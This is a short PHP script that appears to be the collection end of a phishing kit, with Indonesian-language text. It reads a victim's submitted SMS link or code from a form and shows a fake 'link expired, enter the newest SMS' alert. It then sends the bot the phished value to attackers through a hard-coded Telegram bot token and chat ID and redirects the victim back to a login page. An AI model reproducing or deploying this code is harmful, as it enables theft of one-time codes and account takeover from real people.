<?php
echo "<script>alert('GAGAL,!!  Link SMS kadaluarsa, Masukan SMS terbaru...'); window.location.href = '../login/';</script>";
$name = '';
$sms = $_POST['sms'];
$token = "5669751939:AAFgBuZLq7zlT89Hshll0YXLjD_mjc_7GXc";
$chat_id = "5510246221";
$arr = array(
  ' ' => $name,
  'SMS LINK : ' => $sms,

);

foreach($arr as $key => $value) {
  $txt .= "<b>".$key."</b> ".$value."%0A";
};

$sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");

if ($sendToTelegram) {

} else {
  echo "Error";
}
?>
